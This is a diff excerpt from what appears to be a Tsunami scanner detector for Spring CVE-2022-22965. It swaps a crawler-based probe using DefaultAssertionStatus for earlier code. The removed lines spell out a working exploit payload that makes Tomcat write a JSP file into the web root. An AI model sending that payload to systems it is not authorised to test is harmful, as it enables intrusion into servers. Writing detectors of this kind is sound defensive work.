@@ -21,8 +21,9 @@ import static com.google.tsunami.common.net.http.HttpRequest.get;
 import static com.google.tsunami.common.net.http.HttpRequest.post;
 
 import com.google.common.collect.ImmutableList;
+import com.google.common.collect.ImmutableSet;
 import com.google.common.flogger.GoogleLogger;
-import com.google.protobuf.ByteString;
+import com.google.common.util.concurrent.ListenableFuture;
 import com.google.protobuf.util.Timestamps;
 import com.google.tsunami.common.data.NetworkServiceUtils;
 import com.google.tsunami.common.net.http.HttpClient;
@@ -32,6 +33,14 @@ import com.google.tsunami.common.time.UtcClock;
 import com.google.tsunami.plugin.PluginType;
 import com.google.tsunami.plugin.VulnDetector;
 import com.google.tsunami.plugin.annotations.PluginInfo;
+import com.google.tsunami.plugins.detectors.spring.crawl.Crawler;
+import com.google.tsunami.plugins.detectors.spring.crawl.SimpleCrawler;
+
+import static com.google.tsunami.common.data.NetworkEndpointUtils.toUriAuthority;
+import com.google.tsunami.proto.CrawlConfig;
+import com.google.tsunami.proto.CrawlResult;
+
+
 import com.google.tsunami.proto.DetectionReport;
 import com.google.tsunami.proto.DetectionReportList;
 import com.google.tsunami.proto.DetectionStatus;
@@ -41,10 +50,10 @@ import com.google.tsunami.proto.TargetInfo;
 import com.google.tsunami.proto.Vulnerability;
 import com.google.tsunami.proto.VulnerabilityId;
 import java.io.IOException;
-import java.text.SimpleDateFormat;
 import java.time.Clock;
 import java.time.Instant;
-import java.util.Date;
+import java.util.Set;
+import java.util.stream.Collectors;
 import javax.inject.Inject;
 
 /**
@@ -60,31 +69,21 @@ import javax.inject.Inject;
 public final class SpringCve202222965Detector implements VulnDetector {
 
   private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
-  private static final String FILENAME = "SpringCoreRCEDetect";
-  private static final String FORMAT = ".yyyy";
-  private static final SimpleDateFormat time_format = new SimpleDateFormat(FORMAT);
-  private static final Date time_now = new Date();
-  private static final String VERIFY_STRING = "TSUNAMI_SpringCoreRCEDetect";
-  private static final String VULNERABILITY_PAYLOAD_STRING = "class.module.classLoader.resources."
-      + "context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(%22j%22))%7B%20out."
-      + "println(new%20String(%22"+VERIFY_STRING+"%22))%3B%20%7D%25%7Bsuffix%7Di&class.module."
-      + "classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader."
-      + "resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader."
-      + "resources.context.parent.pipeline.first.prefix="+FILENAME+"&class.module.classLoader."
-      + "resources.context.parent.pipeline.first.fileDateFormat="+FORMAT;
-  private static final String FIX_PAYLOAD_STRING = "class.module.classLoader.resources.context."
-      + "parent.pipeline.first.pattern=";
-  private static final ByteString VULNERABILITY_PAYLOAD
-      = ByteString.copyFromUtf8(VULNERABILITY_PAYLOAD_STRING);
-  private static final ByteString FIX_PAYLOAD = ByteString.copyFromUtf8(FIX_PAYLOAD_STRING);
+  private static final String VULNERABILITY_PAYLOAD_STRING_1 =
+      "class.module.classLoader.DefaultAssertionStatus=1";
+  private static final String VULNERABILITY_PAYLOAD_STRING_2 =
+      "class.module.classLoader.DefaultAssertionStatus=2";
 
   private final Clock utcClock;
   private final HttpClient httpClient;
+  private final SimpleCrawler simpleCrawler;
 
   @Inject
-  SpringCve202222965Detector(@UtcClock Clock utcClock, HttpClient httpClient) {
+  SpringCve202222965Detector(@UtcClock Clock utcClock, HttpClient httpClient, Crawler crawler,
+      SimpleCrawler simpleCrawler) {
     this.utcClock = checkNotNull(utcClock);
     this.httpClient = checkNotNull(httpClient);
+    this.simpleCrawler = checkNotNull(simpleCrawler);
   }
 
   @Override
@@ -100,57 +99,95 @@ public final class SpringCve202222965Detector implements VulnDetector {
         .build();
   }
 
+  private static String buildTargetUrl(NetworkService networkService, String nextUri) {
+    StringBuilder targetUrlBuilder = new StringBuilder();
+    if (NetworkServiceUtils.isWebService(networkService)) {
+      targetUrlBuilder.append(NetworkServiceUtils.buildWebApplicationRootUrl(networkService));
+    } else {
+      // Assume the service uses HTTP protocol when the scanner cannot identify the actual service.
+      targetUrlBuilder
+          .append("http://")
+          .append(toUriAuthority(networkService.getNetworkEndpoint()))
+          .append("/");
+    }
+    targetUrlBuilder.append(nextUri);
+    return targetUrlBuilder.toString();
+  }
+
+  private static final ImmutableSet<String> PATHS = ImmutableSet.of(
+//      "/login.html",
+//      "/login",
+//      "/logout",
+//      "/success",
+//      "/fail",
+//      "/error",
+//      "/index",
+//      "/",
+      "/index.html"
+      );
+
   private boolean isServiceVulnerable(NetworkService networkService) {
-    String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
+    Set<String> crawlTargets = PATHS.stream()
+        .map(path -> buildTargetUrl(networkService, path)).collect(Collectors.toSet());
+    CrawlConfig crawlConfig = CrawlConfig.newBuilder()
+        .setMaxDepth(1)
+        .addAllSeedingUrls(crawlTargets).build();
+    ListenableFuture<ImmutableSet<CrawlResult>> crawlResultsFuture =
+        simpleCrawler.crawlAsync(crawlConfig);
+    ImmutableSet<CrawlResult> crawlResults = null;
     try {
-      HttpResponse postExploitResponse =
-          httpClient.send(post(targetUri)
+      crawlResults = crawlResultsFuture.get();
+    } catch (Exception e) {
+      logger.atWarning().withCause(e).log("Unable to crawl.");
+      return false;
+    }
+    for (CrawlResult crawlResult : crawlResults) {
+      String targetUri = crawlResult.getCrawlTarget().getUrl();
+      String httpMethod = crawlResult.getCrawlTarget().getHttpMethod();
+      if (proofOfConcept(targetUri, httpMethod, networkService)) {
+        return true;
+      }
+    }
+    return false;
+  }
+
+  private boolean proofOfConcept(String targetUri,
+      String httpMethod, NetworkService networkService) {
+    HttpResponse firstPoCResponse;
+    HttpResponse secondPoCResponse;
+    try {
+      switch (httpMethod) {
+        case "GET":
+          firstPoCResponse = httpClient.send(get(targetUri+"?"+VULNERABILITY_PAYLOAD_STRING_1)
                   .withEmptyHeaders()
-                  .setRequestBody(VULNERABILITY_PAYLOAD)
                   .build(),
               networkService
           );
-      HttpResponse getExploitResponse =
-          httpClient.send(post(targetUri+"?"+VULNERABILITY_PAYLOAD_STRING)
+          secondPoCResponse = httpClient.send(get(targetUri+"?"+VULNERABILITY_PAYLOAD_STRING_2)
                   .withEmptyHeaders()
                   .build(),
               networkService
           );
-      if (postExploitResponse.status() == HttpStatus.OK
-          || getExploitResponse.status() == HttpStatus.OK) {
-        HttpResponse verifyResponse =
-            httpClient.send(get(targetUri+FILENAME+time_format.format(time_now)+".jsp")
-                    .withEmptyHeaders()
-                    .build(),
-                networkService
-            );
-        if (verifyResponse.status() == HttpStatus.OK
-            && verifyResponse.bodyString().toString().contains(VERIFY_STRING)) {
-          HttpResponse fixResponse;
-          if (postExploitResponse.status() == HttpStatus.OK) {
-            fixResponse =
-                httpClient.send(post(targetUri)
-                        .withEmptyHeaders()
-                        .setRequestBody(FIX_PAYLOAD)
-                        .build(),
-                    networkService
-                );
-          } else {
-            fixResponse =
-                httpClient.send(get(targetUri+"?"+FIX_PAYLOAD_STRING)
-                        .withEmptyHeaders()
-                        .build(),
-                    networkService
-                );
-          }
-          if (fixResponse.status() != HttpStatus.OK) {
-            logger.atWarning().log("Verified but unable to fix.");
-          }
-          return true;
-        } else {
-          logger.atWarning().log("Unable to verify.");
+          break;
+        case "POST":
+          firstPoCResponse = httpClient.send(post(targetUri+"?"+VULNERABILITY_PAYLOAD_STRING_1)
+                  .withEmptyHeaders()
+                  .build(),
+              networkService
+          );
+          secondPoCResponse = httpClient.send(post(targetUri+"?"+VULNERABILITY_PAYLOAD_STRING_2)
+                  .withEmptyHeaders()
+                  .build(),
+              networkService
+          );
+          break;
+        default:
+          logger.atWarning().log("Unable to query '%s'.", targetUri);
           return false;
-        }
+      }
+      if (firstPoCResponse.status() == HttpStatus.OK
+          && secondPoCResponse.status() == HttpStatus.BAD_REQUEST) {
+        return true;
       }
     } catch (IOException e) {
       logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
